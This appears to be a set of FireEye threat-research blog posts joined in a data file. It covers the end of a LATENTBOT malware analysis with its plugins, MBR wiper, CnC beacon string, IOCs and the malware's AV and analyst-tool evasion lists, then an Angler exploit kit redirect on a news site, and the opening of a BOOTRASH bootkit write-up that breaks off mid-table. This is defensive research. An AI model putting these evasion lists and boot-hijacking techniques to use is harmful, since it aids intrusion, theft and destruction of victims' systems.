  <br /> <br /> The registry values shown at the bottom of Figure 19
  have a specific purpose depending on the plugin being used. The values
  can be used as status or integrity-check flags or used to store
  encoded binaries.<br /> <br /> Figure 20 is a diagram showing how the
  plugins will be loaded:<br /> <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig19.jpg"" />
  <br /> <br /> <span class=""type-XS"">Figure 20: Plugins Architecture</span>
  <br /> <br /> <span class=""type-M"">InjectionHelper</span>
  <br /> <br /> A new DLL (InjectionHelper, see Figure 20) is decoded
  from the resources of the sixth stage Delphi binary and loaded to the
  current process via <span class=""code"">BTMemoryLoader</span>, which
  will eventually load (via the <span class=""code"">jMex</span> export)
  the main plugin BOT_ENGINE.<br /> The main purpose of InjectionHelper
  is to load <span class=""code"">svchost.exe</span> and replace it in
  memory – via the process hollowing technique – with the binary
  supplied as an argument. This DLL is actually used by other plugins
  any time a new binary needs to be loaded in memory.<br /> <br /> Once
  InjectionHelper loads the B<span class=""code"">OT_ENGINE</span> plugin,
  it will re-inject itself into new instances of <span class=""code"">svchost.exe</span> multiple times before commencing
  execution, as seen in Figure 21.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig20.png"" />
  <br />  <br /> <span class=""type-XS"">Figure 21: BOT_ENGINE process
    hollowing chain</span>
  <br /> <br /> <span class=""type-M"">Plugins Description</span>
  <br /> <br /> <span class=""type-M"">BOT_ENGINE &amp; SECURITY</span>
  <br /> <br /> BOT_ENGINE is the main plugin responsible for loading
  the rest of the plugins. The loading technique is the same as
  previously documented using the <span class=""code"">BTMemoryLoader</span> Library. BOT_ENGINE communicates
  closely with the SECURITY module. The SECURITY module checks the
  system to see if any antivirus solution was installed, using a list of
  AV products’ default installation paths (see Appendix 1). This list is
  encrypted with the algorithm from Figure 16 using the modifier <span class=""code"">0xBB8</span>.<br /> <br /> If an AV is found on the
  system, the callback will include a GET parameter <span class=""code"">av=&lt;number&gt;</span> (e.g., Avast will be <span class=""code"">av=1</span>).<br /> <br /> There is also a check for GPUs
  with <span class=""code"">EnumDisplayDevice</span> that tries to detect
  display cards from NVidia, ATI and Radeon and report the result with
  the <span class=""code"">vidtype</span> parameter:<br /> 3 possible
  values:<br /> •    <span class=""code"">vidtype=1 </span> for
  NVidia<br /> •    <span class=""code"">vidtype=2 </span>  for ATI or
  Radeon<br /> •    <span class=""code"">vidtype=0</span> for none of the
  above<br /> <br /> BOT_ENGINE is a Delphi program similar to the sixth
  stage Delphi loader, but with patched stubs and new threads to do
  specific tasks. It extracts data from resources and verifies their
  signature using a public key embedded in the malware.<br />
                                               <br /> <span class=""type-M"">Extracting the public key</span>
  <br /> <br /> A key BLOB was imported via <span class=""code"">CryptImportKey</span> API. The BLOB contains a 2048-bit
  RSA public key used to verify signatures.<br /> <br /> Following the
  BLOB Header, we can find the 2048 bits RSA public key as shown in
  Figure 22.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig21.jpg"" />
  <br />  <br /> <span class=""type-XS"">Figure 22: Public key BLOB
    Structure in memory</span>
  <br /> <br /> Other GET parameters that may be sent are shown in Table
  3.<br /> <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbottable2.jpg"" />
  <br /> </p>
 <p>
  <span class=""type-XS"">Table 3: Other GET Parameters</span>
  <br /> <br /> After BOT_ENGINE is successfully installed and all the
  different checks are performed, a query is sent back to the CnC with
  the status of plugin installation along with any errors identified.
  The plugin GET parameter holds the <span class=""code"">plugin</span>
  name.<br /> <br /> Here is an example of a plain text beacon after the
  BOT_ENGINE plugin is successfully installed:<br /> <br /> <span class=""code"">forum?data=US-20-164346373561&amp;ver=4006&amp;os=2&amp;av=19&amp;acs=&amp;x64=0&amp;gr=engine-1.7.1.20-s&amp;li=load-1.7.1.20&amp;plugins=Bot_Engine-881384-8&amp;errcode=0&amp;bk=0&amp;note=0&amp;dom=1&amp;sockslog=0&amp;vidtype=0&amp;random=deabaotabf</span>
  <br /> <br /> Supported BOT_ENGINE commands are listed in Table
  4:<br /> <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbottable3.jpg"" />
  <br /> </p>
 <p>
  <span class=""type-XS"">Table 4: BOT_ENGINE CnC Commands</span>
  <br /> <br /> <span class=""type-M"">PONY Plugin</span></p>
 <p>This plugin is a recent version of Pony Stealer 2.0 malware that
  comes with BITCOIN support to steal Bitcoin wallets as seen in Figure 23.</p>
 <p>
  <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig22.jpg"" />
  <br />               <br /> <span class=""type-XS"">Figure 23: Bitcoin wallet</span>
  <br /> <br /> It looks for wallets for different cryptocurrencies
  (similar to VNC Plugin). Refer to List of Bitcoin Wallets and
  Currencies 1.<br /> <br /> <span class=""type-M"">VNC Plugin</span>
  <br /> <br /> The VNC Plugin is actually more than what its name
  suggests - it has multiple features:<br /> <br /> •    Implements a
  keylogger<br /> •    ICMP Requests<br /> •    MBR Wiper<br /> •  
   Hidden VNC Remote Desktop<br /> •    Manipulate the desktop<br /> •  
   Intercept mouse events<br /> <br /> Supported VNC module commands are
  listed in Table 5.<br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotable4.jpg"" />
  <br /> </p>
 <p>
  <span class=""type-XS"">Table 5: VNC Plugin BOT Commands</span>
  <br /> <br /> Note: For every command executed, the BOT will send the
  encrypted status result to the CnC.<br /> <br /> <span class=""type-M"">VNC Plugin command:</span> <span class=""code"">killosanduninstalls</span>
  <br /> <br /> When this command is executed, the following steps will
  occur:<br /> <br /> 1. The malicious MBR wiper will be extracted and
  decoded from the VNC plugin’s resources and then injected into a new
  instance of <span class=""code"">svchost.exe</span> via the
  InjectionHelper  The MBR Wiper overwrites the first 512 bytes of the
  hard drive represented by <span class=""code"">\\.\Physicaldrive0</span>
  and exits the injected process.<br /> 2.    The parent process will
  proceed to delete any traces of the malware from the registry and file
  system.<br /> 3.    Malicious process running are terminated.<br />
  4.    Then the status message “<b>kill os function started + uninstall
    + shutdown mashine from 10 sec …</b>” is sent to the CnC<br /> 5.  
   Finally a reboot is forced via the <span class=""code"">ExitWindowsEx</span> API leaving the infected PC useless.
  A quick overview of this process is shown in Figure 24.<br /> <br />
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig23.jpg"" />
  <br />  <br /> <span class=""type-XS"">Figure 24: Killing the infected PC</span>
  <br /> <br /> The MD5 of the MBR Wiper
  (<b>4d0b14024d4a7ffcff25f2a3ce337af8</b>) was submitted to VirusTotal
  7 times - from Russia - beginning in July 2013 and it has zero AV
  detections.<br /> <br /> <span class=""type-M"">Running VNC</span>
  <br /> <br /> By running the VNC Plugin module on a system, it is
  possible to simply watch the end user (the victim, in this case) while
  going unnoticed. This differs from a normal RDP session, which would
  log off the end user and make the activity easy to identify.<br />
  <br /> The encoded VNC Plugin is stored in the registry under the
  key:<br /> <br /> <span class=""code"">HKCU\Software\Google\Update\network\secure\</span>
  <br /> <br /> This key stores multiple encrypted subkeys as shown in
  Figure 19. The binary will be decoded and injected into svchost.exe
  via the InjectionHelper. The IP to connect to is encoded in the
  Resources section.<br /> <br /> Before injecting the VNC Plugin,
  LATENTBOT will search for the following VNC processes running in the
  system and kill them to avoid conflicts:<br /> <br /> •   <span class=""code""> tvnserver.exe</span> – TightVNC Software<br /> •   <span class=""code""> winvnc.exe</span> – UltraVNC Software<br /> •     <span class=""code"">vncserver.exe</span> – RealVNC Software<br /> •   <span class=""code""> vncservice.exe</span> – RealVNC Software<br /> <br />
  VNC Plugin command: <span class=""code"">getinstallpluginlist</span>
  <br /> <br /> When this command is executed, the plugin list will be
  extracted from the registry, as already described. The registry values
  will be separated by a dash and the plugins by a comma. The data will
  then be encrypted and sent to the CnC server.<br /> <br /> Figure 25
  is an example of this decrypted plugin list:<br /> <br />  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/LATENTBOT/latentbotfig24.jpg"" />
  <br /> <span class=""type-XS"">Figure 25: Plugin list data decrypted in memory</span>
  <br /> <br /> <span class=""type-M"">VNC Plugin command: findgold</span>
  <br /> <br /> This searches the registry recursively starting at <span class=""code"">HKCU\Software\Classes</span> for strings such as <span class=""code"">Bitcoin</span> or <span class=""code"">TrueCrypt</span>. It
  also searches the file system starting at <span class=""code"">%APPDATA%\Roaming</span> and <span class=""code"">$APPDATA\Roaming\Bitcoin </span>for <span class=""code"">wallet.dat, MultiBit</span> or <span class=""code"">Electrum</span>. See Figure 23 in the appendix for a full
  list of search terms.<br /> <br /> <span class=""type-M"">VNC Plugin
    command: sendCtrlAltDel</span>
  <br /> <br /> This functionality is implemented by loading <span class=""code"">as_sas32.dll</span> and calling its <span class=""code"">sendCtrlAltDel</span> export.<br /> <br /> <span class=""type-M"">Information Gathering</span>
  <br /> <br /> The plugin will gather system information and report it
  to the CnC server only, without using this to stop a process, which
  might trigger an alert.<br /> <br /> The section<i> Searching for
    malware analyst tools</i> in Appendix 1 lists the program names and
  processes that LATENBOT is searching for. Keywords for <span class=""code"">SoftICE</span> or <span class=""code"">filemon</span>
  (which are retired tools) suggest this specific module was created
  long time ago. A specific ID will be assigned to every identified item
  identified and will be reported to the CnC server.<br /> <br /> The
  same list of AVs listed in the BOT_ENGINE plugin were found in this
  one.<br /> <br /> <span class=""type-M"">RDP Plugin</span>
  <br /> <br /> The built-in RDP client provides easy remote
  administration of the victim computer to the attackers, although this
  method would be more intrusive (potentially more noticeable to the
  victim) than the VNC Plugin.<br /> <br /> <span class=""type-M"">Conclusion</span>
  <br /> <br /> In this paper we presented different plugins being used
  by LATENTBOT. Its architectural design allows the payloads to be
  easily updated with new functionalities, so we will be tracking the
  deployment of other plugins closely.<br /> <br /> Although LATENTBOT
  is highly obfuscated, due to the multiple process injections
  performed, it is noisy enough to be easily detected in memory with a
  proper behavior-based solution. Outbound callback tracking and
  blocking is also mandatory in cases when the malware was able to
  bypass the security controls in place.<br /> <br /> <span class=""type-M"">Acknowledgements:</span>
  <br /> <br /> Thanks to Nart Villeneuve for his help during this
  research.<br /> <br /> <a href=""https://www.fireeye.com/blog/threat-research/_jcr_content.feed#_ftnref1"" name=""_ftn1""></a>[1] https://www.fireeye.com/blog/threat-research/2015/04/a_new_word_document.html</p>
 <p>
  <a href=""https://www.fireeye.com/blog/threat-research/_jcr_content.feed#_ftnref1"" name=""_ftn1""></a>[2] Original version can be found
  here: <a href=""https://github.com/strazzere/android-scripts/blob/master/Decoders/TauSpy-iBanking/rollingobfuscation.java"">https://github[.]com/strazzere/android-scripts/blob/master/Decoders/TauSpy-iBanking/rollingobfuscation.java</a></p>
 <p>
  <span class=""type-M"">Appendix 1</span>
  <br /> <br /> IOCs:<br /> <br /> HBI:<br /> <br /> <span class=""code"">HKCU\Software\Microsoft\Windows
    NT\CurrentVersion\Windows\Load  = %AppData%\Roaming\aFwLiiV\dlrznz68mkaa.exe</span>
  <br /> <br /> The binary is a copy of <span class=""code"">aya.exe</span>
  <br /> <br /> <span class=""code"">HKCU\Software\Adobe\Adobe
    Acrobat\data = &lt;random_value&gt;<br />  HKCU\Software\Google\Update\network\secure</span>
  <br /> With 0 to 5 subkeys representing modules names:<br /> <span class=""code"">HKCU\Software\Google\Update\network\secure\hdtWD3zyxMpSQB<br />
    HKCU\Software\Google\Update\network\secure\QdW/DoI2F9J<br />
    HKCU\Software\Google\Update\network\secure\RRrIibQs+WzRVv5B+9iIys+17huxID<br />
    HKCU\Software\Google\Update\network\secure\VRWVBM6UtH6F+7UcwkBKPB<br />
    HKCU\Software\Google\Update\network\secure\zRlBb9ofmNVErtdu<br />
    HKCU\Software\Google\Update\network\update<br />
    HKCU\Software\Google\Common\Rlz\Events\Update<br />  HKCU\Software\Google\Common\Rlz\Events\EventsID</span>
  <br /> <br /> NBI:<br /> <br /> <b>CnC IPs (Some of them are
    compromised legitimate websites):</b>
  <br /> <br /> 46.165.246.234<br /> 209.208.79.114<br />
  REMOTESUPPORT.AARIVERSIDE.COM<br /> 83.175.125.150<br />
  83.175.125.152<br /> OFFICE.ONTIMEDATASOLUTIONS.COM<br />
  ESTREAM.HOMELINUX.COM<br /> 95.211.230.212<br /> 46.165.246.234<br />
  37.220.9.229<br /> SBA-VIG.VIG.PL<br /> SBA2-VIG.VIG.PL<br />
  ITMANAGER.MASPEX.COM<br /> GATE.SPACESOFT.KR<br />
  SUPREMOGW2.NANOSYSTEMS.IT<br /> CMC.COUNTERP.COM<br />
  121.78.119.97<br /> 136.243.16.249<br /> 180.71.39.228<br />
  220.76.17.25<br /> 195.254.174.74<br /> 83.13.163.218<br />
  83.238.72.234<br /> 155.133.120.21<br /> DATAROAD.IPTIME.ORG<br />
  121.67.110.204<br /> <br /> <span class=""type-M"">LATENTBOT Samples</span>
  <br /> <br /> <span class=""code"">1dd0854a73288e833966fde139ffe385
    aya.exe<br />  af15076a22576f270af0111b93fe6e03 lssm.exe<br />
    47f220f6110ecba74a69928c20ce9d3e<br />
    5446022c6d14a45fd6ef412a2d6601c5<br />
    a11362a8e32b5641e90920729d61b3d4<br />
    d349806ea1f2af0f447b2c9e20cb88f0<br />
    6ea9d27d23646fc94e05b8c5e921db99<br />
    56ba76cf35a1121bf83920003c2af825<br />
    2d2484d578bfcd983acb151c89e5a120<br />
    08bb5f82dec4957ad9da12239f606a00<br />
    4135552b0045e7d67b26167f43b88a30<br />
    af15076a22576f270af0111b93fe6e03<br />  4d0b14024d4a7ffcff25f2a3ce337af8</span>
  <br /> <br /> BOT_ENGINE Plugin 1: The list of default installation
  paths of popular AV<br /> <br /> <span class=""code"">Documents and
    Settings\All Users\Application Data\Agnitum<br />  Documents and
    Settings\All Users\Application Data\avg10<br />  Documents and
    Settings\All Users\Application Data\avg8<br />  Documents and
    Settings\All Users\Application Data\avg9<br />  Documents and
    Settings\All Users\Application Data\Avira<br />  Documents and
    Settings\All Users\Application Data\Doctor Web<br />  Documents and
    Settings\All Users\Application Data\ESET<br />  Documents and
    Settings\All Users\Application Data\f-secure<br />  Documents and
    Settings\All Users\Application Data\G DATA<br />  Documents and
    Settings\All Users\Application Data\Kaspersky Lab\<br />  Documents
    and Settings\All Users\Application Data\McAfee<br />  Documents and
    Settings\All Users\Application Data\Microsoft\Microsoft
    Antimalware<br />  Documents and Settings\All Users\Application
    Data\PC Tools<br />  Documents and Settings\All Users\Application
    Data\Symantec<br />  Documents and Settings\All Users\Application
    Data\Trend Micro<br />  Documents and Settings\All Users\AVAST
    Software<br />  Documents and Settings\NetworkService\Local
    Settings\Application Data\F-Secure<br />  Program
    Files\Agnitum<br />  Program Files\Alwil Software<br />  Program
    Files\AVAST Software<br />  Program Files\AVG<br />  Program
    Files\Avira<br />  Program Files\BitDefender9<br />  Program
    Files\Common Files\Doctor Web<br />  Program Files\Common Files\G
    DATA<br />  Program Files\Common Files\PC Tools<br />  Program
    Files\DrWeb<br />  Program Files\ESET<br />  Program Files\F-Secure
    Internet Security<br />  Program Files\FRISK Software<br />  Program
    Files\Kaspersky Lab<br />  Program Files\McAfee<br />  Program
    Files\Microsoft Security Essentials<br />  Program Files\Norton
    AntiVirus<br />  Program Files\Panda Security<br />  Program
    Files\PC Tools Internet Security</span>
  <br /> <span class=""code"">Program Files\Symantec<br />  Program
    Files\Trend Micro<br />  Program Files\Vba32</span>
  <br /> <br /> <span class=""type-M"">VNC Plugin:</span>
  <br /> <br /> <b>Searching for malware analyst tools</b>
  <br /> <br />  <span class=""code"">OLLYDBG<br />   DBG<br />
     W32DSM<br />   drivers\sice.sys<br />   drivers\ntice.sys<br />
     drivers\syser.sys<br />   drivers\winice.sys<br />
     drivers\sice.vxd<br />   drivers\winice.vxd<br />
     winice.vxd<br />   vmm32\winice.vxd<br />   sice.vxd<br />
     hgfs.sys<br />   vmhgfs.sys<br />   prleth.sys<br />
     prlfs.sys<br />   prlmouse.sys<br />   prlvideo.sys<br />
     prl_pv32.sys<br />   vpc-s3.sys<br />   vmsrvc.sys<br />
     vmx86.sys<br />   vmnet.sys<br />   \\.\SICE<br />
     \\.\SIWVID<br />   \\.\NTICE<br />   \\.\TRW<br />   \\.\TWX<br />
     \\.\ICEEXT<br />   \\.\Syser<br />   \\.\SyserDbgMsg<br />
     \\.\SyserBoot<br />   SbieDll.dll<br />   api_log.dll<br />
     dir_watch.dll<br />   dbghelp.dll<br />   pstorec.dll<br />
     Sandbox<br />   honeyq<br />   vmware<br />   nepenthes<br />
     snort<br />   andyd<br />   c:\analysis<br />
     joeboxcontrol.exe<br />   wireshark.exe<br />   regmon.exe<br />
     filemon.exe<br />   procmon.exe<br />   SandboxieRpc<br />
     SandboxieDcomLaunch.exe<br />   VBoxService.exe<br />
     VMwareTray.exe<br />   VMwareService.exe<br />
     VMwareUser.exe<br />   xenservice.exe<br />   sniff_hit.exe<br />
     sysAnalyzer.exe<br />   procexp.exe<br />   autoruns.exe<br />
     prl_cc.exe<br />   LoadOrd.exe<br />   Diskmon.exe<br />
     RootkitRevealer.exe<br />   portmon.exe<br />   Tcpview.exe<br />
     Dbgview.exe<br />   procdump.exe<br />   cfp.exe</span>
  <br /> <br /> <span class=""type-M"">PONY STEALER Plugin</span>: List of
  Bitcoin Wallets and Currencies 1</p>
 <p>Bitcoin Currencies:<br /> <br /> Bitcoin<br /> Litecoin<br />
  Namecoin<br /> Terracoin<br /> PPcoin<br /> Primecoin<br />
  Feathercoin<br /> Novacoin<br /> Freicoin<br /> Devoin<br />
  Franko<br /> Megacoin<br /> Quarkcoin<br /> Worldcoin<br />
  Infinitecoin<br /> Ixcoin<br /> Anoncoin<br /> BBQcoin<br />
  Digitalcoin<br /> Mincoin<br /> Goldcoin<br /> Yacoin<br />
  Zetacoin<br /> Fastcoin<br /> I0coin<br /> Tagcoin<br />
  Bytecoin<br /> Florincoin<br /> Phoenixcoin<br /> Luckycoin<br />
  Craftcoin<br /> Junkcoin<br /> <br /> Wallets:<br /> <br /> Armory
  wallet<br /> Electrum wallet<br /> Multibit wallet<br /> </p>",http://www.fireeye.com/blog/threat-research/2015/12/latentbot_trace_me.html
Cybercrime News Results In Cybercrime Blues,"<h5>
  <b>INTRODUCTION</b></h5>
 <p>FireEye Labs recently spotted a 2011 article on cybercrime from the
  news site theguardian[.]com that redirects users to the Angler Exploit
  Kit. Successful exploitation by Angler resulted in a malware infection
  for readers of the article. A spokesperson for the guardian[.]com
  responded that they &quot;are aware of FireEye's claims and are
  working to rectify the issue in question as soon as possible.&quot;</p>
 <p>FireEye Labs first detected the activity on Dec. 1, 2015.
  Ironically, the affected article was titled “Cybercrime: is it out of
  control?” and covered various aspects of cybercrime. As it turns out,
  visiting the page shown in Figure 1 and Figure 2 silently redirected
  browsers to an Angler Exploit Kit landing page.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig1.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Article URL</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig2.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Image from main page, highlighting
    cybercrime issues</span></p>
 <p>The article loaded several other pages and links, including links
  for syndication shown in Figure 3 and Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig3.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Sharing and syndication links</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig4.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. Syndication page URL</span></p>
 <p>When the syndication link is loaded in the background, readers are
  eventually redirected to Angler’s landing page via injected HTML that
  crafts the request to the Angler landing page.</p>
 <p>Visible in the HTML response is the script that would craft the URL
  to the Angler landing page. (Figure 5)</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig5.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Injected script that loads the Angler
    landing page</span></p>
 <p>Once loaded, the page would execute the embedded script and redirect
  the reader to the Angler landing page located at the URL in Figure 6:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig6.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Angler landing page URL</span></p>
 <p>This redirect resulted in a new GET request (Figure 7) that loaded
  the landing page (Figure 8) and set up the exploitation stage.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardian7.jpg"" /></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig8.jpg"" /></p>
 <p>Figure 7. Angler GET request, syndication link URL visible in
  Referrer field</p>
 <h5>
  <b>EXPLOITS</b></h5>
 <p>Old exploits never die…</p>
 <p>The use of an OLE Automation vulnerability exploited through
  VBScript, along with evidence of potential Flash exploitation, can be
  observed in this particular attack.</p>
 <p>Angler unconditionally attempted to exploit a popular vulnerability:
    <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2014/11/operation_doubletap.html"" target=""_blank"">CVE-2014-6332</a>. This is a memory corruption
  vulnerability in Windows Object Linking and Embedding (OLE)
  Automation, which can be triggered through VBScript with Internet
  Explorer as seen below.</p>
 <p>The vulnerable code resided in OLEAUT32!SafeArrayRedim, where the
  original size of an array was not properly restored when an “Out of
  memory” error occured while resizing an array. This issue allowed for
  out-of-bounds memory access. In this attack the exploit was based on a
  publicly available PoC, and techniques from that PoC were used to
  attempt arbitrary code execution. Figure 8 shows Angler’s obfuscated
  version of the <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2014/11/operation_doubletap.html"" target=""_blank"">CVE-2014-6332</a>
  vulnerability trigger.</p>
 <p>
  <br /> <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig9.jpg"" /></p>
 <p>Figure 8. Angler landing page contents</p>
 <p>Angler also unconditionally embedded a Flash object in the page at
  runtime. The FlashVars included crypto constants for D-H (g, u), and a
  URL to the payload (exec). Angler’s server then decided whether to
  serve a Flash exploit, presumably based on information in the request
  like x-flash-version.<br /> <br /> The de-obfuscated object tag used
  to embed Flash movie files can be seen below in Figure 9:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig10.jpg"" /></p>
 <p>Figure 9. Angler CVE-2014-6332 triggering function</p>
 <p>It was common practice for Angler to decide which, if any, Flash
  exploit to deliver to the target at runtime. Most recently, we 
  observed Angler delivering a number of high profile exploits. These
  included, but were not limited to, <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/07/second_adobe_flashz0.html"" target=""_blank"">CVE-2015-5122</a>,
  CVE-2015-5560, and CVE-2015-7645.</p>
 <p>Typically, prior to conducting any exploitation on the system,
  Angler Exploit Kit attempted to detect whether Anti-Virus products or
  analysis tools are present. If Angler determined that such an object
  is present, it changed its behavior. For example, if Angler detected
  one such product, it invalidated its D-H parameters and the attack
  silently failed (Figure 10).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig11.jpg"" /></p>
 <p>Figure 10. Tag for Flash object from JavaScript</p>
 <p>Another change bound to the presence of AV/analysis objects
  determines whether or not the malicious VBScript exploit is loaded. If
  detected, a non-malicious VBScript will be used instead. Or, it would
  if they remembered to unescape the string (Figure 11):</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig12.jpg"" /></p>
 <p>Figure 11. Return appropriate result based on the AV vendor check</p>
 <p>This attack was discovered in FireEye Dynamic Threat Intelligence.
  Additional syndication URLs are also redirecting to Angler (Figure 12):</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Guardian/guardianfig13.jpg"" /></p>
 <p>Figure 12. Constructing VBScript depending upon the presence of
  AV/analysis objects</p>
 <p>Visitors to the site are encouraged to use caution to avoid
  potentially becoming infected.</p>",http://www.fireeye.com/blog/threat-research/2015/12/cybercrime-news.html
"Thriving Beyond The Operating System: Financial Threat Group Targets
Volume Boot Record","<p>In September, Mandiant Consulting identified a financially motivated
  threat group targeting payment card data using sophisticated malware
  that executes before the operating system boots. This rarely seen
  technique, referred to as a ‘bootkit’, infects lower-level system
  components making it very difficult to identify and detect. The
  malware’s installation location also means it will persist even after
  re-installing the operating system, widely considered the most
  effective way to eradicate malware.</p>
 <p>We first identified this activity during a recent investigation at
  an organization in the financial industry. We identified the presence
  of a financially motivated threat group that we track as FIN1, whose
  activity at the organization dated back several years. The threat
  group deployed numerous malicious files and utilities, all of which
  were part of a malware ecosystem referred to as ‘Nemesis’ by the
  malware developer(s),<a name=""_ftnref1""></a>[1] and used this malware
  to access the victim environment and steal cardholder data. FIN1,
  which may be located in Russia or a Russian-speaking country based on
  language settings in many of their custom tools, is known for stealing
  data that is easily monetized from financial services organizations
  such as banks, credit unions, ATM operations, and financial
  transaction processing and financial business services companies.</p>
 <p>Nemesis, the malware ecosystem used by FIN1, includes comprehensive
  backdoors that support a variety of network protocols and
  communication channels for command and control (CnC). It provides a
  robust set of capabilities, including: file transfer, screen capture,
  keystroke logging, process injection, process manipulation, and task
  scheduling. The threat group continually updated the Nemesis malware
  during their ongoing access to the victim environment, deploying
  several different variants of the same tools and adding functionality
  between iterations. In early 2015, FIN1 updated their toolset to
  include a utility that modifies the legitimate system Volume Boot
  Record (VBR) and hijacks the system boot process to begin loading
  Nemesis components before the Windows operating system code. We refer
  to this utility as BOOTRASH.</p>
 <h5>A Brief Refresh</h5>
 <p>On a Windows system, the Master Boot Record (MBR) is critical to the
  boot process. The MBR stores information about the disk, including the
  number and layout of any partitions, and a small amount of code used
  during the boot process.<a name=""_ftnref2""></a>[2] This code searches
  for the primary active partition, and passes control over to that
  partition's VBR.<a name=""_ftnref3""></a>[3]</p>
 <p>A VBR, on partitioned devices, is located in the first sector of an
  individual partition. The VBR contains machine code specific to the
  operating system or program on that partition. For example, in
  situations where more than one operating system is installed on a
  computer, each operating system is installed on a separate partition
  and each partition contains a VBR with instructions on how to start
  the respective operating system.<a name=""_ftnref4""></a>[4] The VBR
  instructs the operating system code to begin the boot process, which
  involves loading the necessary software into memory.</p>
 <p>Figure 1 depicts a simplified boot process. The MBR loads the VBR,
  which loads the operating system code. BOOTRASH hijacks this boot
  process in order to load the Nemesis payload before the operating
  system boots.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/BOOTRASH/bootrashfig1.jpg"" /></p>
 <p>Figure 1. Simplified normal boot process</p>
 <h5>BOOTRASH Step by Step</h5>
 <p>To successfully hijack the boot process, the malware first uses a
  complex multi-step process to create a custom virtual file system<a name=""_ftnref5""></a>[5] to store the Nemesis components in the
  unallocated space between partitions. It then hijacks the original VBR
  by overwriting the bootstrap code with its own malicious code. The
  bootstrap code calls the Nemesis bootkit, which intercepts certain
  boot process functions and injects the Nemesis components into the
  Windows kernel. Following is a description of the installation and
  hijacking process:</p>
 <h5>Step 1: System Checks</h5>
 <p>Prior to installation, the BOOTRASH installer gathers statistics
  about the system, including the operating system version and
  architecture. The installer is capable of deploying 32-bit or 64-bit
  versions of the Nemesis components depending on the system’s processor
  architecture. The installer will install the bootkit on any hard disk
  that has a MBR boot partition, regardless of the specific type of hard
  drive. However, if the partition uses the GUID Partition Table disk
  architecture, as opposed to the MBR partitioning scheme, the malware
  will not continue with the installation process.</p>
 <p>The malware checks to make sure a copy of the BOOTRASH installer is
  not already running on the system. It also checks to see if the
  Microsoft .NET 3.5 framework is installed on the system - a
  prerequisite for the malware. If the installer is already running or
  the .NET framework is not installed, the malware will quit.</p>
 <h5>Step 2: Available Space Calculations &amp; Virtual File System Creation</h5>
 <p>BOOTRASH creates its own custom virtual file system (VFS) to store
  the components of the Nemesis ecosystem. The malware performs several
  calculations to determine the positioning of the file system and
  whether the system has enough space to fit the file structure.</p>
 <p>To determine how much space is needed for the installation, the
  malware uses Windows Management Instrumentation (WMI) to query the
  system’s boot disk and partition. The malware then calculates the
  total size of the 32-bit or 64-bit components to ensure there is
  enough space for the custom file system in the free space between the
  system’s partitions.</p>
 <h5>Step 3: Boot Sector Hijacking</h5>
 <p>The installer reads the original boot sector into memory and saves
  an encoded backup copy of the VBR code at 0xE sectors from the start
  of the partition. Next, the malware applies two algorithms
  (CRC16-CCITT and MD5) to the original boot sector in order to check
  its integrity at a later time. With the original boot sector saved,
  the malware decodes the new bootstrap code from one of its embedded
  resources and overwrites the existing bootstrap code, effectively
  hijacking the boot process of the compromised system.</p>
 <h5>Step 4: Nemesis Component Installation</h5>
 <p>The installer always uses the virtual file system for saving the
  three components responsible for creating and installing the bootkit:
  vbr.bin, vbs.bin, and bootldr.sys.  The rest of the components can be
  either saved in the virtual file system or as binary data within the
  HKCU\.Default\Identities registry keys. These components are
  responsible for the primary C2 functionality of the Nemesis ecosystem
  that includes: file transfer, screen capture, keystroke logging,
  process injection, process manipulation, and task scheduling.</p>
 <p>Table 1 details the associated registry keys.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""474""> <tbody>
    <tr>
      <td width=""374""><p>
          <b>Registry Value Name</b></p> </td> <td width=""100""><p>
          <b>File Content</b></p> </td> </tr></tbody>
  <tbody>
    <tr>
      <td width=""374""><p>HKCU\.Default\Identities\{3D04DDFA-AE6F-4BC2-9AE6-4A76A471147A}</p>
      </td> <td width=""100""><p>core.sys</p> </td> </tr>
    <tr>
